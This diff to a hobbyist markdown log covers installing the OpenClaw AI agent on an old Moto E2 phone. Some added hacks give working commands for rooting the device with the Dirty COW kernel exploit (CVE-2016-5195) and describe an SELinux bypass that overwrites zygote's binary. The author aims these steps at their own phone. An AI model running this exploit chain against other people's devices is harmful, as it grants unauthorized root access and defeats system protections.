@@ -1,6 +1,6 @@
 # PocketClaw — OpenClaw sur un Moto E2 (The Impossible Install)
 
-> "They said it couldn't be done. We did it anyway. 20 hacks later."
+> "They said it couldn't be done. We did it anyway. 30 hacks later."
 
 **Date :** 10-11 février 2026
 **Appareil :** Motorola Moto E2 (2015) — codename `surnia`/`otis`
@@ -22,7 +22,7 @@
 | git | Impossible à installer | Requis par npm | **Absent** |
 
 **Verdict officiel : IMPOSSIBLE.**
-**Verdict réel : 20 hacks plus tard, ça tourne.**
+**Verdict réel : 30 hacks plus tard, ça tourne.**
 
 ---
 
@@ -30,7 +30,7 @@
 
 Avant tout hack logiciel, le téléphone doit être allégé au maximum :
 
-- **Launcher :** Remplacer le launcher stock par KISS Launcher (ultra-léger, ~2 Mo RAM)
+- **Launcher :** PocketClaw Launcher APK (8.5 KB WebView, see Hack #30)
 - **Debloat :** Désactiver/supprimer toutes les apps inutiles (Google Play Movies, Google Music, etc.)
 - **Optimisation batterie :** Désactiver l'optimisation batterie pour Termux (sinon Android le kill en arrière-plan)
 - **Carte SD :** 4 Go minimum si le stockage interne < 16 Go (on a utilisé une 57 Go)
@@ -38,7 +38,7 @@ Avant tout hack logiciel, le téléphone doit être allégé au maximum :
 
 ---
 
-## Les 20 Hacks
+## Les 30 Hacks
 
 ### Hack #1 — proot-distro manuel
 **Problème :** proot-distro n'est pas dans les repos Termux pour Android 6.
@@ -659,6 +659,85 @@ proot ... /bin/bash -c "... && . /root/.openclaw/env && export MOONSHOT_API_KEY 
 
 **Statut : ✅ RÉSOLU — Clés API invisibles dans `ps`**
 
+### Hack #24 — Dirty COW Root (CVE-2016-5195)
+**Problème :** Le kernel 3.10.49 du Moto E2 n'a jamais été patché contre Dirty COW. On a besoin de root pour tuer GMS (-270 Mo), mais le bootloader est verrouillé.
+
+**Solution :** Exploit Dirty COW — race condition dans le copy-on-write du kernel Linux qui permet d'écraser des fichiers read-only (comme `/system/bin/run-as`).
+
+```bash
+# Télécharger les sources (timwr/CVE-2016-5195)
+curl -sL -o dirtycow.c https://raw.githubusercontent.com/timwr/CVE-2016-5195/master/dirtycow.c
+curl -sL -o dcow.c https://raw.githubusercontent.com/timwr/CVE-2016-5195/master/dcow.c
+curl -sL -o run-as.c https://raw.githubusercontent.com/timwr/CVE-2016-5195/master/run-as.c
+
+# Compiler dans Termux (clang 9)
+cat > logfix.h << 'EOF'
+#define __android_log_print(...) (0)
+#define ANDROID_LOG_INFO 4
+EOF
+clang -pthread -include logfix.h -DPRINT -o dirtycow dirtycow.c dcow.c -Wall
+clang -o run-as-payload run-as.c -ldl -Wall
+
+# Copier vers /data/local/tmp (accessible par ADB shell)
+cp dirtycow run-as-payload /sdcard/
+# Puis depuis ADB shell :
+cp /sdcard/dirtycow /data/local/tmp/ && cp /sdcard/run-as-payload /data/local/tmp/
+chmod 755 /data/local/tmp/dirtycow /data/local/tmp/run-as-payload
+
+# Exploiter !
+/data/local/tmp/dirtycow /data/local/tmp/run-as-payload /system/bin/run-as
+# "patch successful, iterations 1"
+
+# Root shell
+/system/bin/run-as
+# uid=0(root) gid=0(root)
+```
+
+**Résultat :** Root temporaire (perdu au reboot — /system est read-only, Dirty COW modifie seulement le page cache).
+
+**Ce que root peut faire :**
+- `am force-stop com.google.android.gms` → -270 Mo instantanément
+- `pm disable com.google.android.gms` → GMS ne respawne plus
+- `pm enable/install` → restaurer des packages
+
+**Ce que root NE PEUT PAS faire (SELinux `u:r:shell:s0` bloque) :**
+- `sysctl -w vm.swappiness=10` → Permission denied
+- `setenforce 0` → Permission denied
+- `ip route add` → Permission denied
+- Accéder à `/data/system/` → Permission denied
+- Écrire dans `/cache/` → Permission denied
+
+**Statut : ✅ FONCTIONNE — Root temporaire, GMS tué, 265 Mo total sans GMS**
+
+### Hack #25 — Recovery après Boot Loop (leçon douloureuse)
+**Problème :** Après avoir supprimé `com.motorola.android.providers.settings` (MotorolaSettingsProvider), le phone entre en boot loop permanent. Le framework Android (PhoneWindowManager) crash toutes les 90 secondes car le ContentProvider Motorola est introuvable.
+
+**Cause root :** `MotorolaSettings` est une classe du framework ROM (pas un package installable). Elle appelle un ContentProvider fourni par `com.motorola.android.providers.settings`. Sans ce provider, `MotorolaSettings.getInt()` → NPE → `WindowManagerService` crash → system_server restart → boucle infinie.
+
+**Tentatives de fix (TOUTES échouées) :**
+
+| # | Approche | Résultat |
+|---|---|---|
+| 1 | `pm install -r MotorolaSettingsProvider.apk` | PM inaccessible (system_server crash trop vite) |
+| 2 | `pm install-existing` | Commande inexistante sur API 23 |
+| 3 | `service call package` | Service enregistré mais pas fonctionnel |
+| 4 | Safe mode (`persist.sys.safemode`) | Même crash (MotorolaSettings est system-level) |
+| 5 | Root shell → `rm /data/system/.../package-restrictions.xml` | SELinux denied |
+| 6 | Dirty COW sur package-restrictions.xml | `open()` bloqué par SELinux |
+| 7 | Dirty COW sur dex2oat (contexte SELinux différent) | Code exécuté ! Mais dex2oat n'a pas `write` sur system_data_file |
+| 8 | `ndc`, broadcast intent, settings put | Tous bloqués (boot pas complété / SELinux) |
+
+**Solution :** Factory reset (seule option). Puis re-setup complet.
+
+**Leçons critiques :**
+- **JAMAIS supprimer un package Motorola provider** — ils sont liés au framework ROM
+- **Tester UN package à la fois**, rebooter entre chaque, vérifier que le boot complète
+- `svc wifi disable` persiste au reboot — toujours réactiver avant de rebooter
+- Backuper env + openclaw.json AVANT toute opération risquée
+- `run-as com.termux` depuis ADB fonctionne même en boot loop (accès aux données Termux)
+
+**Statut : ⚠️ FACTORY RESET NÉCESSAIRE — Config et scripts backupés**
+
 ---
 
 ## Fichiers Clés sur le Téléphone
@@ -670,6 +749,7 @@ Termux ($PREFIX = /data/data/com.termux/files/usr)
 │   ├── restart-gw         ← Clean kill + restart
 │   ├── run-proot          ← Script helper proot (Hack #10)
 │   ├── pocketclaw         ← CLI unifiée (start/stop/restart/status/logs/monitor)
+│   ├── boot-debloat       ← ADB-side: Dirty COW + pm disable 51+ packages (Hack #28)
 │   ├── healthcheck        ← Cron : restart si gateway freeze (toutes les 2 min)
 │   └── logrotate-pc       ← Cron : rotation logs (toutes les heures)
 ├── var/lib/proot-distro/installed-rootfs/ubuntu/  ← Ubuntu 25.10
@@ -806,7 +886,7 @@ export NODE_OPTIONS='-r /root/hijack.js --expose-gc --max-old-space-size=192'
 |---|---|---|
 | Ubuntu 25.10 dans proot | ✅ | armhf, Node.js 22.12.0 |
 | OpenClaw 2026.2.9 | ✅ | Gateway run, port 9000 |
-| V8 heap | ✅ | `--max-old-space-size=192` (Hack #20) |
+| V8 heap | ✅ | `--max-old-space-size=128` (Hack #27) |
 | ESM stubs | ✅ | 9 packages stubbés (Hack #19) |
 | npm packages nettoyés | ✅ | 13 packages supprimés, node_modules 413 → 151 Mo |
 | Gateway RSS | ✅ | **~178 Mo** (était 224 Mo au départ, -21%) |
@@ -820,9 +900,12 @@ export NODE_OPTIONS='-r /root/hijack.js --expose-gc --max-old-space-size=192'
 | Log rotation | ✅ | Cron toutes les heures |
 | Periodic GC | ✅ | `global.gc()` toutes les 60s via hijack.js |
 | IPv6 DNS | ✅ | Hack #15 |
-| Android debloat | ⚠️ | 31 packages supprimés (dont launcher), GMS intouchable sans root (Hack #21) |
+| Android debloat | ✅ | 51+ packages disabled via Dirty COW boot-debloat (Hack #28) |
 | GMS kill (static IP) | ⚠️ | Fonctionne depuis ADB, pas depuis Termux (Hack #22) |
 | API keys sécurisées | ✅ | Chargées depuis env file, invisibles dans `ps` (Hack #23) |
+| Dashboard | ✅ | `/dashboard` + `/api/status` injected via hijack.js (Hack #29) |
+| PocketClaw Launcher | ✅ | 8.5 KB APK, WebView HOME (Hack #30) |
+| boot-debloat | ✅ | 51 packages disabled via Dirty COW (Hack #28) |
 
 ### Logs du gateway qui tourne :
 ```
@@ -1008,7 +1091,6 @@ adb shell "run-as com.termux sh -c 'export PREFIX=/data/data/com.termux/files/us
 
 ### Reste à faire
 - **Root le téléphone** — **SEUL blocker restant** : `am force-stop` depuis Termux + freeze GMS = -270 Mo RAM permanent
-- **Stabilité 24h** — laisser tourner une nuit complète, vérifier les logs
 - **Deploy config live** — Groq fallback, identity/personnalité, customCommands (seulement dans l'example JSON, pas sur le phone)
 - **Test sans proot après root** — Node 22 fonctionne via `ld-linux-armhf.so.3`, mais proot coûte du CPU
 - **Considérer rendre le repo public**
@@ -1047,6 +1129,198 @@ adb shell "run-as com.termux sh -c 'export PREFIX=/data/data/com.termux/files/us
 
 ---
 
+---
+
+## Hack #26 — Dirty COW SELinux Bypass : réécrire /data/system/ depuis zygote
+
+**Problème :** Boot loop causé par `pm uninstall --user 0` sur `com.motorola.android.providers.settings`. SELinux bloque TOUTE écriture vers `/data/system/` depuis le contexte `u:r:shell:s0` (même en root uid=0). Factory reset (recovery ET bootloader) ne wipe PAS `/data/system/` sur ce device.
+
+**Contextes testés et résultats :**
+
+| Contexte SELinux | Source | Accès `/data/system/` |
+|---|---|---|
+| `u:r:shell:s0` | Dirty COW run-as | read: DENIED, write: DENIED |
+| `u:r:dex2oat:s0` | Dirty COW dex2oat | read: OK, write: DENIED |
+| `u:r:zygote:s0` | Dirty COW app_process32 | read: OK, write: DENIED |
+| `u:r:zygote:s0` + COW race | Dirty COW embedded | read: OK, **write: BYPASS** |
+
+**La technique :**
+1. Cross-compiler un binaire ARM avec le NDK (`-nostdlib -static -Os`, 2232 bytes)
+2. Le binaire embarque le Dirty COW race : `open(O_RDONLY)` → `mmap(MAP_PRIVATE)` → race `madvise(MADV_DONTNEED)` + `write(/proc/self/mem)`
+3. Dirty COW ce binaire sur `/system/bin/app_process32` (remplace zygote)
+4. init redémarre zygote → notre code tourne en `u:r:zygote:s0`
+5. En contexte zygote : `open(O_RDONLY)` sur `package-restrictions.xml` est AUTORISÉ
+6. Le COW race écrit par `/proc/self/mem` → bypasse le check SELinux `{ write }` normal
+7. `sync` + reboot → pages dirty flushées sur disque → fix permanent
+
+**Pourquoi ça marche :** Le Dirty COW race n'utilise pas le syscall `write()` normal sur le fichier (que SELinux intercepte). Il écrit dans le page cache via la race condition `madvise(MADV_DONTNEED)` + `/proc/self/mem`. Le kernel ne fait pas de check SELinux sur cette path car c'est un bug de race condition dans `get_user_pages()`.
+
+**Compilation (depuis Windows avec NDK) :**
+```bash
+NDK="$HOME/AppData/Local/Android/Sdk/ndk/27.1.12297006"
+CC="$NDK/toolchains/llvm/prebuilt/windows-x86_64/bin/armv7a-linux-androideabi23-clang"
+$CC -nostdlib -static -Os -fno-stack-protector -o fix-zygote2 fix-zygote2.c -Wall
+# Résultat : 2232 bytes, ELF ARM static, pas de libc
+```
+
+**IMPORTANT :** NDK 27 dynamic binaries produisent `DT_FLAGS_1=0x8000001` que le linker Android 6 ne supporte pas → le binaire se charge mais crashe silencieusement. Toujours utiliser `-nostdlib -static`.
+
+**Séquence d'exécution :**
+```bash
+# 1. Root via Dirty COW
+./dirtycow run-as-payload /system/bin/run-as
+
+# 2. Remplacer zygote avec notre fix
+./dirtycow fix-zygote2 /system/bin/app_process32
+
+# 3. Attendre ~5-10 secondes (init restart zygote)
+# 4. Sync depuis root shell
+echo 'sync; sync; sync' | /system/bin/run-as
+
+# 5. Reboot (restaure app_process32 original, garde le fix sur disque)
+reboot
+```
+
+**Leçon :** Le Dirty COW embedded (COW race DANS le payload) est la technique ultime pour écrire dans des fichiers protégés par SELinux. La seule condition : trouver un contexte qui a le droit de `read` le fichier cible.
+
+---
+
+### Hack #27 — Heap 128 MB (aggressive minimum)
+
+After debloating 51+ packages (Hack #28), the phone has much more headroom. Binary search continued from Hack #20:
+
+| Heap | Boot | Notes |
+|---|---|---|
+| 192 (previous prod) | OK | 60-90 MB margin |
+| 128 | OK | Stable, 448 MB total used |
+| 96 | OOM | Crash at boot |
+
+Production lowered from 192 → 128 MB. The RSS doesn't change (~175 MB) because native V8 + Node.js code is incompressible, but the lower heap cap means V8 GCs earlier and more aggressively, leaving more RAM for Android.
+
+```bash
+# In start-openclaw.sh
+export NODE_OPTIONS='-r /root/hijack.js --expose-gc --max-old-space-size=128'
+```
+
+**Status: OK — Gateway stable at heap 128 MB, ~448 MB total system RAM used**
+
+---
+
+### Hack #28 — boot-debloat (51+ packages via Dirty COW)
+
+**Problem:** After factory reset (Hack #25), all packages are back. Manual `pm disable` one-by-one is tedious and error-prone. Need an automated debloat script that runs Dirty COW + disables everything in one shot.
+
+**Additional discovery:** 9 more packages found during this round:
+- `com.motorola.ccc.*` (5 packages: devicemanagement, checkin, mainplm, ota, notification)
+- `com.motorola.context` (context awareness)
+- `com.motorola.contacts.preloadcontacts`
+- `com.motorola.groundloopnoisepreventer` (audio)
+- `com.motorola.wappushsi` (WAP push)
+
+**Solution:** `boot-debloat.sh` — a single script that:
+1. Runs Dirty COW to get root via `/system/bin/run-as`
+2. Pipes 70+ `pm disable` commands through root shell
+3. Reports how many packages disabled
+
+```bash
+# After reboot with USB connected:
+adb shell /data/local/tmp/boot-debloat.sh
+# [boot-debloat] Root OK
+# [boot-debloat] Complete — 51 packages disabled
+```
+
+**LIMITATION:** Must run from ADB shell (uid 2000). Termux (uid 10001) cannot access `/system/bin/run-as` (permissions `rwxr-x---`, group=shell). No workaround — this is a filesystem permission issue, not SELinux.
+
+**`pm disable` vs `pm uninstall`:** We switched to `pm disable` because:
+- `pm disable` via root **persists across reboot** (writes to `package-restrictions.xml`)
+- `pm disable` is **reversible** (`pm enable` to restore)
+- `pm uninstall -k --user 0` on Android 6 is PERMANENT — no `pm install-existing`
+
+**Status: OK — 51 packages disabled in one command. ~416 MB used after debloat.**
+
+---
+
+### Hack #29 — Dashboard (hijack.js v2)
+
+**Problem:** No way to see the phone's status at a glance. SSH + `pocketclaw status` works but requires a terminal.
+
+**Solution:** Inject `/dashboard` and `/api/status` routes directly into OpenClaw's HTTP server via hijack.js. Zero additional processes, zero additional RAM.
+
+**How it works:**
+1. Monkey-patch `http.Server.prototype.listen` to intercept the `emit("request")` event
+2. Before OpenClaw sees the request, check if it's `/dashboard` or `/api/status`
+3. If yes, serve our response and short-circuit. If no, pass to OpenClaw normally.
+
+**`/api/status` response (JSON):**
+```json
+{
+  "gateway": {"status": "up", "code": 200},
+  "wifi": true,
+  "ram": {"used": 448, "total": 898},
+  "swap": {"used": 26, "total": 256},
+  "uptime": "1h 9m",
+  "lastError": null,
+  "telegram": true,
+  "groq": false
+}
+```
+
+**All data sources — zero shell commands:**
+- RAM/Swap: `/proc/meminfo` (with fallback for missing `MemAvailable` on kernel 3.10)
+- Uptime: `/proc/uptime`
+- WiFi: Node `http.get("http://clients3.google.com/generate_204")` every 10s
+- Telegram: always `true` (we ARE the gateway process)
+- Errors: scan `/tmp/openclaw/*.log` for `ERROR` lines
+- Groq: `!!process.env.GROQ_API_KEY`
+
+**`/dashboard` — CRT-style HTML:**
+- Black background with scanline overlay (CSS `repeating-linear-gradient`)
+- Animated lobster ASCII art (2 frames, hidden `<pre>` elements)
+- Live status indicators (pulsing green dots)
+- RAM bar with block characters
+- Auto-refresh every 3 seconds via `fetch("/api/status")`
+- Mobile-optimized (viewport meta, no scroll, touch-disabled)
+
+**Status: OK — Dashboard live at `http://localhost:9000/dashboard`, zero extra RAM**
+
+---
+
+### Hack #30 — PocketClaw Launcher APK (8.5 KB)
+
+**Problem:** KISS Launcher was using ~33 MB of RAM just to show a search bar we never use. The phone's screen should show the dashboard, not a launcher.
+
+**Solution:** Build a minimal Android APK that:
+1. Is a HOME launcher (intent-filter with `CATEGORY_HOME`)
+2. Contains a fullscreen WebView pointing to `http://localhost:9000/dashboard`
+3. Disables the back button (it's a launcher, not an app)
+4. Reloads on resume (always fresh data when screen turns on)
+
+**Build chain (no Android Studio, no Gradle):**
+```bash
+# Compile Java → class files
+javac -source 1.7 -target 1.7 -bootclasspath android.jar LauncherActivity.java
+
+# Convert to DEX (Android bytecode)
+d8 --min-api 23 --output build/ LauncherActivity.class
+
+# Package APK
+aapt package -f -M AndroidManifest.xml -I android.jar -F build/unsigned.apk
+cd build && aapt add unsigned.apk classes.dex
+
+# Sign APK
+apksigner sign --ks debug.keystore --ks-pass pass:android build/unsigned.apk
+
+# Install + set as HOME
+adb install -r build/unsigned.apk
+pm disable fr.neamar.kiss  # disable KISS, PocketClaw becomes default HOME
+```
+
+**Result:** 8.5 KB APK. The phone's home screen IS the dashboard. Press Home → see RAM, WiFi, Telegram status, uptime, errors. All live. All from a phone in a drawer.
+
+**Status: OK — PocketClaw Launcher installed as HOME, KISS disabled**
+
+---
+
 *"On m'a dit que c'était impossible, alors je l'ai fait." — Probablement pas Einstein, mais on s'en fout.*
 
-*Total : ~5 heures du premier `pkg install` au premier message IA reçu sur Telegram. 23 hacks. 0€ de hardware. Un Moto E2 de 2015 qui fait tourner un agent IA autonome en 2026. 176 Mo de RSS au lieu de 224 Mo, 151 Mo de node_modules au lieu de 413 Mo, 31 packages Android supprimés, ~400 Mo libres en autonome (657 Mo avec USB kills).*
+*Total : ~6 heures du premier `pkg install` au dashboard sur l'ecran d'accueil. 30 hacks. 0 EUR de hardware. Un Moto E2 de 2015 qui fait tourner un agent IA autonome en 2026 avec son propre dashboard CRT et un APK launcher de 8.5 KB.*
